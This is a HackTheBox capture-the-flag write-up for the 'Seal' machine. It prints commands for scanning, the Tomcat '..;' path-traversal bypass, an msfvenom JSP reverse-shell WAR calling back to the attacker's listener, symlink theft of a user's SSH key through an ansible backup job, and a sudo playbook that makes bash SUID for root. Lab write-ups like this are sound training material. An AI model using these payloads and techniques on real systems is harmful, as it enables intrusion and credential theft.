+++ 
date = 2021-11-15T09:23:11+01:00
title = "HackTheBox - Seal"
description = "Writeup for HackTheBox's Seal."
slug = "seal"
author = "Bufu"
tags = ["cleartext credentials", "file misconfiguration", "path traversal"]
categories = ["HackTheBox", "Linux", "Medium"]
externalLink = ""
series = []
+++

![Seal Card Info](/images/writeups/htb-seal/seal.png)

- [user.txt](#usertxt)
  - [Nmap Scan](#nmap-scan)
  - [Cleartext Credentials in Gitbucket](#cleartext-credentials-in-gitbucket)
  - [Accessing Tomcat Manager](#accessing-tomcat-manager)
  - [Deploying the WAR File](#deploying-the-war-file)
  - [Shell as luis](#shell-as-luis)
- [root.txt](#roottxt)

## user.txt

### Nmap Scan

We begin by adding the IP address of our machine to our hosts file. This way, we don't need to remember the actual IP address of our machine and can access it through our chosen hostname.

```bash
echo -e "10.129.255.250\tseal seal.htb" >> /etc/hosts
```

Next, we start an `nmap` scan of all ports on the target, which includes service and version detection, as well as default scripts.

```
# Nmap 7.91 scan initiated Mon Nov 15 09:22:54 2021 as: nmap -sCV -T4 -p- -oN scans/nmap.txt seal
Nmap scan report for seal (10.129.255.250)
Host is up (0.042s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Mon, 15 Nov 2021 08:23:07 GMT
|     Set-Cookie: JSESSIONID=node0nuf6xz8hioauqgus2erosmq52.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Mon, 15 Nov 2021 08:23:06 GMT
|     Set-Cookie: JSESSIONID=node010u9i4o834ppp12tbtcgpa2zxy0.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 15 Nov 2021 08:23:06 GMT
|     Set-Cookie: JSESSIONID=node0l61qxwc215s91wkvmyncrqkfa1.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.91%I=7%D=11/15%Time=619218F6%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,F5,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Mon,\x2015\x
SF:20Nov\x202021\x2008:23:06\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node010u9
SF:i4o834ppp12tbtcgpa2zxy0\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20T
SF:hu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/ht
SF:ml;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,108,"H
SF:TTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2015\x20Nov\x202021\x2008:23:06
SF:\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0l61qxwc215s91wkvmyncrqkfa1\.n
SF:ode0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x
SF:2000:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow:
SF:\x20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReque
SF:st,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text/
SF:html;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20clos
SF:e\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Versi
SF:on</pre>")%r(FourOhFourRequest,F3,"HTTP/1\.1\x20401\x20Unauthorized\r\n
SF:Date:\x20Mon,\x2015\x20Nov\x202021\x2008:23:07\x20GMT\r\nSet-Cookie:\x2
SF:0JSESSIONID=node0nuf6xz8hioauqgus2erosmq52\.node0;\x20Path=/;\x20HttpOn
SF:ly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nConte
SF:nt-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r
SF:(Socks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nCon
SF:tent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\n
SF:Connection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\
SF:x20Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/1\.1\x204
SF:00\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;ch
SF:arset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r
SF:\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x2
SF:0CNTL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCo
SF:ntent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x
SF:20400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 15 09:23:28 2021 -- 1 IP address (1 host up) scanned in 33.75 seconds
```

### Cleartext Credentials in Gitbucket

The most interesting port seems to be port 8080. Checking out the webpage, it shows us a login page for a common VCS: `Gitbucket`.

![Gitbucket Login](/images/writeups/htb-seal/gitbucket_login.png)

We can register an account and login by clicking **Create One.** or navigating to http://seal.htb:8080/register.

![Gitbucket Register](/images/writeups/htb-seal/gitbucket_register.png)

We can then login with our new credentials and get redirected to the main page.

![Gitbucket Startpage](/images/writeups/htb-seal/gitbucket_startpage.png)

The startpage shows a couple of interesting things. We can see two repositories: `seal_market` and `infra`. We can also see two possible usernames from newly opened comments and issues: `luis` and `alex`.

We continue by checking out one of the repositories, `seal_market`. We can see in the files, that there is a folder called `tomcat`. This indicates that this is the source code for the web application running on port 443, since we saw it is running Apache Tomcat as well from the nmap scan.

![Gitbucket seal_market](/images/writeups/htb-seal/gitbucket_seal_market.png)

As this is a application based on Tomcat, the most interesting file is the `tomcat_users.xml` file. This file usually contains cleartext credentials.

To see the revision history for this specific file, we can use the following command:

```bash
git log -p tomcat_users.xml
```

![Tomcat Credentials](/images/writeups/htb-seal/tomcat_credentials.png)

Scrolling all the way down, to the initial version, shows us cleartext credentials!

```
tomcat:42MrHBf*z8{Z%
```

### Accessing Tomcat Manager

Using our new credentials, we can now access the status page for Tomcat at https://seal.htb/manager/status!

![Tomcat Access](/images/writeups/htb-seal/tomcat_access.png)

When trying to access the actual manager application at https://seal.htb/manager/html, it only gives a `403 Forbidden`.

![Tomcat Nginx](/images/writeups/htb-seal/tomcat_nginx.png)

We can see, however, that Tomcat is using nginx, which is typically used as a reverse proxy. We can confirm this by going back to the Gitbucket repository and checking out the configuration file at http://seal.htb:8080/root/seal_market/blob/master/nginx/sites-available/default.

After some research on how to bypass this, we find a Path Traversal vulnerability, which is the result of a normalization inconsistency between Tomcat and nginx. There is a well-written article [here](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/).

We can now access the Tomcat Manager by browsing to https://seal.htb/manager/status/..;/html.

![Tomcat Manager](/images/writeups/htb-seal/tomcat_manager.png)

### Deploying the WAR File

Getting code execution in the Tomcat Manager is fairly trivial. We simply need to generate a WAR file containing our reverse shell, then upload and activate it in the manager. The only caveat here is, that we need to intercept the upload request in Burp and change the URL to include our Path Traversal. Otherwise, we will get a 403 and the uploads fails.

First, we generate our payload with msfvenom and set up our netcat listener.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.19 LPORT=443 -f war -o shell.war
nc -nvlp 443
```

We start up Burp, enable the Proxy and deploy our WAR file. Be sure to change the POST URL to something like:

```
POST /manager/status/..;/html/upload?org.apache.catalina.filters.CSRF_NONCE=96798E7C3576B35AC1919B0792CF5A23 HTTP/1.1
```

We can then trigger the shell by browsing to https://seal.htb/shell/ and receive a session as the `tomcat` user!

![Shell as tomcat](/images/writeups/htb-seal/tomcat_shell.png)

### Shell as luis

Checking out the running processes shows a cronjob being executed by the root user. 

![Cronjob](/images/writeups/htb-seal/ansible.png)

It seems to run an `ansible playbook` with the privileges of `luis`. The playbook is located at `/opt/backups/playbook/run.yml`.

```yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

The playbook seems to backup all of the files in `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` to `dest=/opt/backups/archives`. The interesting part about this is the `copy_links=yes` option. This option means that if there is a symlink in the folder that we want to backup, it will backup the file the link is pointing to, instead of just the symlink. Since the job is running with the privileges of `luis`, we might be able to read files this user has access to, such as passwords or SSH keys.

To begin exploiting this, we firt need to check if we can actually write to any of the backup locations. Checking the permissions reveals that there is a world-writable directory at

```
/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
```

Then, we simply create a symlink pointing to luis' home directory.

```bash
ln -s /home/luis/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/luis
```

After about a minute, we can see a backup archive!

![Backup Archive](/images/writeups/htb-seal/archive.png)

We move the file to prevent it from being deleted and extract it.

```bash
cp backup-2021-11-15-10\:30\:33.gz /tmp/backup.gz
cd /tmp
tar xvzf backup.gz
```

It seems there was indeed an SSH key in the user home directory!

```bash
ls dashboard/uploads/luis/.ssh/
```

![SSH Key](/images/writeups/htb-seal/ssh_key.png)

Then, we adjust the permissions on the key and use it to login!

```bash
chmod 600 id_rsa
ssh -i id_rsa luis@seal
```

![Shell as luis](/images/writeups/htb-seal/luis_shell.png)

We can also read the `user.txt` file.

![User.txt](/images/writeups/htb-seal/user.txt.png)

## root.txt

It seems that our new user can actually execute a command using `sudo` without supplying a password!

```bash
sudo -l
```

![Sudo Permissions](/images/writeups/htb-seal/sudo.png)

We can create a custom playbook that will execute commands on the system.

```yml
- hosts: localhost
  tasks:
  - name: SUID Bash 
    command: chmod +s /bin/bash
```

This playbook will set the SUID bit on `bash`, allowing us to escalate to root.

![SUID Bash](/images/writeups/htb-seal/suid.png)

We can then simply spawn a root shell and read the flag!

```bash
bash -p
```

![Root Shell](/images/writeups/htb-seal/root_shell.png)
